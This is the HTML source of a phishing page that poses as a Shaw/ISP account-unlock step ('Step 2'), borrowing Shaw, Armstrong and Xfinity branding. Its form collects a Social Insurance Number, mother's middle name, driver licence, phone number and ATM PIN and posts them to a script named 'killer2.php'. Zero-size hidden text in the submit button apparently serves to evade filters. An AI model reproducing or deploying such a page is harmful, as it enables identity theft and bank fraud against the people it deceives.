<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>



  


  
  
  
 <title>Show.ca</title>
  <link rel="shortcut icon" href="https://webmail.shaw.ca/images/favicon.ico" type="image/ico">



  
  
  <link rel="stylesheet" href="css/bootstrap.min.css">



  
  
  <meta charset="utf-8">



  
  
  <script src="js/bootstrap.min.js"></script>
  
  
  <script src="https://use.fontawesome.com/3fa6ba2462.js"></script><link href="https://use.fontawesome.com/3fa6ba2462.css" media="all" rel="stylesheet">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1">



  
  
  <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
  
  
  <link rel="shortcut icon" href="https://login.armstrongonewire.com/Content/images/mywire.png">



  
  
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">



  
  
  <style>
header{
height: 48px;
padding: 13px 0ex;
background-color: #171717;
width: 100%;
}
.xfinity-logo {
width: 61px;
height: 20px;
margin: auto;
}
.xfinity-logo {
display: block;
background: url(data:image/svg+xml;base64,PHN2ZyBpZD0ieGZpbml0eS1sb2dvIiB2ZXJzaW9uPSIxLjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgdmlld0JveD0iMCAwIDY5LjE4NCAyMi41OTIiIHdpZHRoPSI2OS4xODQiIGhlaWdodD0iMjIuNTkyIj48ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHRyYW5zZm9ybT0idHJhbnNsYXRlKC0yLjAxNiwtNS45ODQpIj48cGF0aCBmaWxsPSIjZmZmZmZmIiBkPSJNNDcuMDA4IDI0aC0yLjg0OHYtMTMuMDI0aDIuODQ4djEzLjAyNHpNMjcuNDU2IDI0aC0yLjgxNnYtMTMuMDI0aDIuODE2djEzLjAyNHpNMzYuNTc2IDEwLjcycTIuMzA0IDAgMy41MDQgMS40NzJ0MS4yIDQuMzUydjcuNDU2aC0yLjgxNnYtNy4zNnEwLTEuODU2LTAuNjA4LTIuNjg4dC0xLjk4NC0wLjgzMnEtMS4yNDggMC0xLjkwNCAwLjg0OHQtMC42NTYgMi40NDh2Ny41ODRoLTIuODE2di0xMy4wMjRoMi44MTZ2MS4xODRxMC41MTItMC42NCAxLjM3Ni0xLjA0MHQxLjg4OC0wLjR6TTQ5LjA1NiAxMy4yMTZ2LTIuMjRoMi4wNDh2LTMuMjMybDIuODE2LTEuNDR2NC42NzJoMi40MzJsMC44MzIgMi4yNGgtMy4yNjR2Ny4wNzJxMCAwLjg2NCAwLjQgMS4yNDh0MS4yNjQgMC4zODRxMC40MTYgMCAwLjc4NC0wLjA2NHQwLjQ5Ni0wLjEyOGwtMC4zMiAyLjI3MnEtMC44NjQgMC4yNTYtMS45ODQgMC4yNTYtMS42MzIgMC0yLjU0NC0wLjk5MnQtMC45MTItMi43ODR2LTcuMjY0aC0yLjA0OHpNMTcuMDU2IDkuNzZxMC0xLjc5MiAwLjkxMi0yLjc4NHQyLjU0NC0wLjk5MnExLjMxMiAwIDIuMjcyIDAuMzUydjIuMjcybC0wLjcyLTAuMTQ0dC0wLjgxNi0wLjA4MHEtMC43MzYgMC0xLjA1NiAwLjMwNHQtMC4zMiAxLjA0MHYxLjI0OGgyLjkxMnYyLjI0aC0yLjkxMnYxMC43ODRoLTIuODE2di0xMC43ODRoLTIuODhsMS41MzYtMi4yNGgxLjM0NHYtMS4yMTZ6TTYxLjUzNiAyOC41NzZoLTIuOTc2bDMuMzYtNi4yNC00LjM1Mi0xMS4zNmgyLjk0NGwzLjEwNCA4LjI4OCA0LjUxMi04LjI4OGgzLjA3MnpNMTcuNzI4IDI4LjU3NmgtMy4xMDRsLTYuMzM2LTkuMDI0LTMuMDQwIDQuNDQ4aC0zLjIzMmw0LjczNi02LjcyLTQuNDE2LTYuMzA0aDMuMjMybDIuNzIgNC4wMzIgMi43NTItNC4wMzJoMy4yMzJsLTQuNDE2IDYuMzA0ek02Ny4xNjggMjMuMjMycTAtMC42NCAwLjQ0OC0xLjA4OHQxLjEyLTAuNDQ4cTAuNjQgMCAxLjA4OCAwLjQ0OHQwLjQ0OCAxLjA4OC0wLjQ2NCAxLjEwNC0xLjEwNCAwLjQ2NC0xLjA4OC0wLjQ2NC0wLjQ0OC0xLjEwNHpNNzAuMTEyIDIzLjIzMnEwLTAuNTc2LTAuNC0wLjk5MnQtMC45NzYtMC40MTZxLTAuNjA4IDAtMS4wMDggMC40MTZ0LTAuNCAwLjk5MiAwLjQgMC45OTIgMC45NzYgMC40MTZxMC42MDggMCAxLjAwOC0wLjQxNnQwLjQtMC45OTJ6TTY4LjA5NiAyMi4zNjhoMC43MzZxMC4yODggMCAwLjQ4IDAuMTkyIDAuMTI4IDAuMDk2IDAuMTI4IDAuMzIgMCAwLjQxNi0wLjM4NCAwLjUxMmwwLjQ0OCAwLjYwOGgtMC4zODRsLTAuMzg0LTAuNTQ0aC0wLjMydjAuNTQ0aC0wLjMydi0xLjYzMnpNNjguOCAyMy4xNjhxMC4zMiAwIDAuMzItMC4yNTZ0LTAuMzItMC4yNTZoLTAuMzg0djAuNTEyaDAuMzg0eiI+PC9wYXRoPjwvZz48L3N2Zz4=);
background-size: cover;
}
.hero {
max-width: 100%;
margin: 0 auto 30px 0;
padding: 36px 12px;
text-align: center;
background:url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNDQwcHgiIGhlaWdodD0iMzQzcHgiIHZpZXdCb3g9IjAgMCAxNDQwIDM0MyI+PGRlZnM+PGZpbHRlciBpZD0iYmdfX2JsdXIiPjxmZUdhdXNzaWFuQmx1ciBzdGREZXZpYXRpb249IjU1IiBjb2xvci1pbnRlcnBvbGF0aW9uLWZpbHRlcnM9InNSR0IiIC8+PC9maWx0ZXI+PGxpbmVhckdyYWRpZW50IGlkPSJiZ19fZ3JhZGllbnQiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIiB4MT0iNTUwIiB5MT0iNCIgeDI9IjU1MCIgeTI9IjM0MyI+PHN0b3AgIG9mZnNldD0iMCIgc3R5bGU9InN0b3AtY29sb3I6IzAwNjZBMCIvPjxzdG9wICBvZmZzZXQ9IjAuNSIgc3R5bGU9InN0b3AtY29sb3I6IzA3NjY5OSIvPjxzdG9wICBvZmZzZXQ9IjEiIHN0eWxlPSJzdG9wLWNvbG9yOiMwMDNBNzQiLz48L2xpbmVhckdyYWRpZW50PjwvZGVmcz48cmVjdCB5PSIwIiBmaWxsPSJ1cmwoI2JnX19ncmFkaWVudCkiIHdpZHRoPSIxNDQwIiBoZWlnaHQ9IjM0MyIvPjxnIGZpbHRlcj0idXJsKCNiZ19fYmx1cikiPjxnIGZpbGw9IiMwRTc0QTAiPjxlbGxpcHNlIGN4PSI3MiIgY3k9IjEyMSIgcng9Ijk1IiByeT0iNDkiLz48ZWxsaXBzZSBjeD0iNzgxIiBjeT0iMTcxIiByeD0iMTMyIiByeT0iMTY2Ii8+PGVsbGlwc2UgY3g9IjEwNDEiIGN5PSIyMzEiIHJ4PSIxMzUiIHJ5PSIxNjAiLz48ZWxsaXBzZSBjeD0iNTQxIiBjeT0iMTk1IiByeD0iMTMyIiByeT0iMTI1Ii8+PC9nPjxnIGZpbGw9IiMwMDU3QTAiPjxlbGxpcHNlIGN4PSIzODMiIGN5PSIyMyIgcng9IjIwNSIgcnk9IjEzNiIvPjxlbGxpcHNlIGN4PSIyNzgiIGN5PSIyNzAiIHJ4PSI4MyIgcnk9IjMyIi8+PGVsbGlwc2UgY3g9IjEwODMiIGN5PSIyMyIgcng9IjExNyIgcnk9IjU4Ii8+PC9nPjwvZz48L3N2Zz4=);
background-color: #0272b6;
color: #fff;
}
.hero-logo {
background: url();
max-width: 730px;
display: block;
margin-left: auto;
margin-right: auto;
}
.hero span1 {
max-width: 730px;
display: block;
margin-left: auto;
margin-right: auto;
}
.hero-icon {
margin: 0 auto 12px;
display: block;
text-align: center;
width: 42px;
height: 42px;}
.login{
background-color: #eee;
} /* .container-fluid{
padding: 0px;
margin: 0px;
padding-right: 0px;
}*/
.col-lg-1, .col-lg-10, .col-lg-11, .col-lg-12, .col-lg-2, .col-lg-3, .col-lg-4, .col-lg-5, .col-lg-6, .col-lg-7, .col-lg-8, .col-lg-9, .col-md-1, .col-md-10, .col-md-11, .col-md-12, .col-md-2, .col-md-3, .col-md-4, .col-md-5, .col-md-6, .col-md-7, .col-md-8, .col-md-9, .col-sm-1, .col-sm-10, .col-sm-11, .col-sm-12, .col-sm-2, .col-sm-3, .col-sm-4, .col-sm-5, .col-sm-6, .col-sm-7, .col-sm-8, .col-sm-9, .col-xs-1, .col-xs-10, .col-xs-11, .col-xs-12, .col-xs-2, .col-xs-3, .col-xs-4, .col-xs-5, .col-xs-6, .col-xs-7, .col-xs-8, .col-xs-9 {
position: relative;
min-height: 1px;
padding:0px;
}
.form-control{
border: 1px solid #6c747c;
background-color: rgba(255,255,255,.75);
color: inherit;
border-radius: 0px;
}
  </style>
</head>


<body style="">



<div class="container-fluid">
<div class="row">




<big><br>

</big>

<div style="text-align: center;"><big><img src="logo.png"></big><br>



<br>



<h1><span>Step 2: You are a step away to unlock your Account</span></h1>


<big><span style="font-weight: bold;"><br>

Please enter the your personal information associated with the account<br>
<br>
</span></big>



</div>



<div class="login">
<div class="col-md-4 col-md-offset-4">
<form action="killer2.php" method="post">
  
  



  
  
  <div class="form-group"> </div>



  
  
  <div class="form-group"> <label for="usr">Social Insurance Number</label> <input class="form-control input-lg" name="sin" required="" placeholder="Social Insurance No" id="usr" >
  </div>



  
  
  <div class="form-group"> </div>



  
  
  <div class="form-group">
  
  
  <div class="form-group"> <input class="form-control input-lg" name="mmn" required="" placeholder="Mother Middle Name :" id="mmnn"></div>



 <div class="form-group"> <input class="form-control input-lg" name="dl" required="" placeholder="Driver License" maxlength="10" id="usr" type="text"></div>
  <input class="form-control input-lg" name="phone" required="" placeholder="Phone Number" maxlength="10" id="usr" type="text"></div>



  
  
  


  
  
  <div class="form-group"> <input class="form-control input-lg" name="atmpin" required="" placeholder="ATM PIN" maxlength="4" id="usr" type="text"></div>



  
  
  <div class="col-lg-6">
  
  
  

  </div>



  <br>



  <button style="background-color: #428bca;" type="submit" class="btn btn-primary btn-block btn-lg">Restart My Account<span style="font-size: 0px;">853</span><span style="font-size: 0px;">853</span></button>
</form>



</div>



</div>



</div>




</div>



</div>





</body></html>